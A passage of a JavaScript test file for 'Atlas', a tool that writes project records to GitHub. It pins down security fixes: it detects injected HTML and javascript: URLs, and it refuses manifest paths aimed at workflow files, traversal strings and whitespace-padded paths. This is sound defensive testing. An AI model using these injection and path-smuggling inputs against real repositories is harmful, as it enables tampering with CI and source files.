      !/<(iframe|svg|object|embed|form|input)/i.test(html),
      `${JSON.stringify(answer)} put a tag on the page`,
    );
    assert.ok(
      !/(href|src)\s*=\s*"\s*(javascript|vbscript|data):/i.test(html),
      `${JSON.stringify(answer)} put a script URL on the page`,
    );
    assert.equal(
      (html.match(/<h[1-6]/gi) ?? []).length,
      headingsBefore,
      `${JSON.stringify(answer)} added a heading to the register`,
    );
  }
});

test('answer: the rule exists because the renderer really would run it — pinned, not assumed', () => {
  // If this ever fails, `src/markdown.mjs` has stopped rendering inline HTML and the flat refusal
  // in `whyNotWritableText` could be relaxed. Until then it is the whole reason for it: decision 11
  // needs `html: true` for the corpus's `<sub>` citations, and the site carries no CSP.
  const html = renderMarkdown(`# A record\n\n${XSS}\n`, { hrefBase: '' });
  assert.match(html, /<script/i, 'the renderer no longer emits raw HTML — revisit the answer rule');
  assert.match(html, /onerror/i);
});

// --- I3: what a manifest can talk Atlas into writing ------------------------------------------------

test('acceptance: a manifest naming a workflow file is refused — records live under docs/', async () => {
  // Traversal was already closed. In-repo containment was not: a manifest naming
  // `.github/workflows/deploy.yml` produced a 200 and a PUT to that path. It needs repo write to
  // set up, so it is not remotely reachable — but decision 35 is a question about what Atlas can
  // be made to write, and "anything in the repository" is the wrong answer to it.
  for (const record of [
    '.github/workflows/deploy.yml',
    'action.yml',
    'src/build.mjs',
    'package.json',
    'atlas.config.json',
    'ROADMAP.md',
    'api/lib/handlers.mjs',
  ]) {
    const manifest = JSON.stringify({ milestones: [{ id: 'M1', acceptance: { kind: 'k', record } }] });
    const github = gitHub({ [MANIFEST_PATH]: manifest, [record]: 'whatever was there\n' });

    const response = await handleAcceptance(
      post(AUTHOR, { workstream: 'a-stream', milestone: 'M1', result: 'pass' }),
      deps(github),
    );

    assert.ok(response.status >= 400, `${record} was accepted as an acceptance record`);
    assert.equal(
      github.calls.filter((c) => c.method === 'PUT').length,
      0,
      `${record} was written to`,
    );
    assert.match(response.body.message, /docs\//, `the refusal does not say where records live`);
  }
});

test('acceptance: a manifest cannot point Atlas at another manifest either', async () => {
  // Under docs/, so the containment rule alone would allow it — and editing a manifest is the
  // first thing decision 35 takes away.
  const record = 'docs/features/another-stream/workstream.json';
  const manifest = JSON.stringify({ milestones: [{ id: 'M1', acceptance: { kind: 'k', record } }] });
  const github = gitHub({ [MANIFEST_PATH]: manifest, [record]: '{}\n' });

  const response = await handleAcceptance(
    post(AUTHOR, { workstream: 'a-stream', milestone: 'M1', result: 'pass' }),
    deps(github),
  );

  assert.ok(response.status >= 400);
  assert.equal(github.calls.filter((c) => c.method === 'PUT').length, 0);
  assert.match(response.body.message, /manifest/i);
});

test('acceptance: an ordinary record anywhere under docs/ still writes', async () => {
  // The rule has to leave the real case alone: an acceptance record is a document, and a project
  // may keep it anywhere in its records.
  for (const record of ['docs/features/a-stream/m1-demo.md', 'docs/acceptance/2026/m1.md', 'docs/a.md']) {
    const manifest = JSON.stringify({ milestones: [{ id: 'M1', acceptance: { kind: 'k', record } }] });
    const github = gitHub({ [MANIFEST_PATH]: manifest, [record]: '# A record\n' });

    const response = await handleAcceptance(
      post(AUTHOR, { workstream: 'a-stream', milestone: 'M1', result: 'pass' }),
      deps(github),
    );

    assert.equal(response.status, 200, `${record} was refused: ${response.body.message}`);
    assert.equal(response.body.path, record);
  }
});

test('acceptance: the refusal names the manifest, because that is the file somebody has to fix', async () => {
  const manifest = JSON.stringify({
    milestones: [{ id: 'M1', acceptance: { kind: 'k', record: '.github/workflows/deploy.yml' } }],
  });
  const github = gitHub({ [MANIFEST_PATH]: manifest });
  const response = await handleAcceptance(
    post(AUTHOR, { workstream: 'a-stream', milestone: 'M1', result: 'pass' }),
    deps(github),
  );
  assert.match(response.body.message, /workstream\.json/);
  assert.match(response.body.message, /deploy\.yml/);
});

// --- the minors the review named ------------------------------------------------------------------

test('a request that does not say what method it is, is refused — every guard here fails closed', async () => {
  // `(request.method ?? 'POST')` was the one guard in the file that assumed the safe answer when
  // it was not told. Nothing else in the write path does that, and a host that hands over a
  // request with no method is a host Atlas does not understand.
  for (const method of [undefined, null, '', 'GET', 'PUT', 'DELETE']) {
    const github = repo();
    const response = await handleAnswer(
      { method, headers: AUTHOR, body: { workstream: 'a-stream', question: 'Q1', answer: 'x' } },
      deps(github),
    );
    assert.equal(response.status, 405, `${JSON.stringify(method)} was accepted as a method`);
    assert.equal(github.calls.length, 0);
  }
});

test('a sha that no blob SHA could be is refused before anything is read', async () => {
  // GitHub blob SHAs are 40 hex characters (64 under SHA-256). The rule accepted anything shaped
  // `sha-...`, which was the test stub's own spelling leaking into the contract.
  for (const sha of ['sha-docs/features/a-stream/open-questions.md-0', 'not-a-sha', 'zzzz', '../..', 123]) {
    const github = repo();
    const response = await handleAnswer(
      post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer: 'x', sha }),
      deps(github),
    );
    assert.equal(response.status, 400, `${JSON.stringify(sha)} was accepted as a SHA`);
    assert.equal(github.calls.length, 0);
  }
});

test('a real blob SHA is accepted, in both lengths GitHub issues', async () => {
  for (const sha of ['a'.repeat(40), 'b'.repeat(64)]) {
    const github = repo();
    const response = await handleAnswer(
      post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer: 'x', sha }),
      deps(github),
    );
    // A conflict, because the register's SHA is not this one — but a conflict is the endpoint
    // having accepted the value and compared it, which is the point.
    assert.equal(response.status, 409, `${sha.slice(0, 8)}… was rejected as a SHA`);
  }
});

test('no refusal quotes the configured repository back to whoever asked', async () => {
  // The caller is an authenticated author, so this is not much of a leak — but the repository is a
  // deployment setting, and a refusal has no reason to recite one.
  const github = repo();
  const responses = [
    await handleAnswer(post(AUTHOR, { workstream: 'no-such-stream', question: 'Q1', answer: 'x' }), deps(github)),
    await handleAcceptance(post(AUTHOR, { workstream: 'no-such-stream', milestone: 'M1', result: 'pass' }), deps(github)),
    await handleAnswer(post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer: 'x' }), deps(github, {})),
  ];
  for (const response of responses) {
    assert.ok(
      !response.body.message.includes('an-owner/a-repo'),
      `a refusal named the repository: ${response.body.message}`,
    );
  }
});

// --- the string that is validated and the string that is used are one string ---------------------

test('acceptance: the two whitespace records from the re-review are refused, and nothing is PUT', async () => {
  // Executed against the previous implementation with a valid `author` principal, these gave:
  //   " docs/x.md"  -> 200, PUT to .../contents/%20docs/x.md
  //   "docs/x.md "  -> 200, PUT to .../contents/docs/x.md%20
  // because the rule validated `record.trim()` and the handler then used `record`.
  for (const record of [' docs/x.md', 'docs/x.md ']) {
    const manifest = JSON.stringify({ milestones: [{ id: 'M1', acceptance: { kind: 'k', record } }] });
    const github = gitHub({ [MANIFEST_PATH]: manifest, [record]: '# A record\n', 'docs/x.md': '# A record\n' });

    const response = await handleAcceptance(
      post(AUTHOR, { workstream: 'a-stream', milestone: 'M1', result: 'pass' }),
      deps(github),
    );

    assert.equal(response.status, 409, `${JSON.stringify(record)} was accepted`);
    assert.equal(response.body.error, 'unwritable-record');
    assert.match(response.body.message, /whitespace/i);
    assert.equal(
      github.calls.filter((c) => c.method === 'PUT').length,
      0,
      `${JSON.stringify(record)} was written to`,
    );
  }
});

test('acceptance: every whitespace spelling is refused, not just the two that were tried', async () => {
  for (const record of ['\ndocs/x.md', '\tdocs/x.md', ' docs/x.md', '﻿docs/x.md', 'docs/x.md\n']) {
    const manifest = JSON.stringify({ milestones: [{ id: 'M1', acceptance: { kind: 'k', record } }] });
    const github = gitHub({ [MANIFEST_PATH]: manifest, 'docs/x.md': '# A record\n' });

    const response = await handleAcceptance(
      post(AUTHOR, { workstream: 'a-stream', milestone: 'M1', result: 'pass' }),
      deps(github),
    );

    assert.ok(response.status >= 400, `${JSON.stringify(record)} was accepted`);
    assert.equal(github.calls.filter((c) => c.method === 'PUT').length, 0);
  }
});

test('acceptance: whatever path is written is byte-for-byte the path the rule approved', async () => {
  // The property behind the two tests above, stated once: the URL that gets a PUT contains exactly
  // the record the manifest named, with no normalising in between for a later reader to overlook.
  const record = 'docs/features/a-stream/m1-demo.md';
  const manifest = JSON.stringify({ milestones: [{ id: 'M1', acceptance: { kind: 'k', record } }] });
  const github = gitHub({ [MANIFEST_PATH]: manifest, [record]: DEMO });

  const response = await handleAcceptance(
    post(AUTHOR, { workstream: 'a-stream', milestone: 'M1', result: 'pass' }),
    deps(github),
  );

  assert.equal(response.status, 200);
  assert.equal(response.body.path, record);
  const [put] = github.calls.filter((c) => c.method === 'PUT');
  assert.ok(put.url.endsWith(`/contents/${record.split('/').map(encodeURIComponent).join('/')}`), put.url);
  assert.ok(!/%20|%09|%0A|%EF%BB%BF/i.test(put.url), `the written path was not the approved one: ${put.url}`);
});
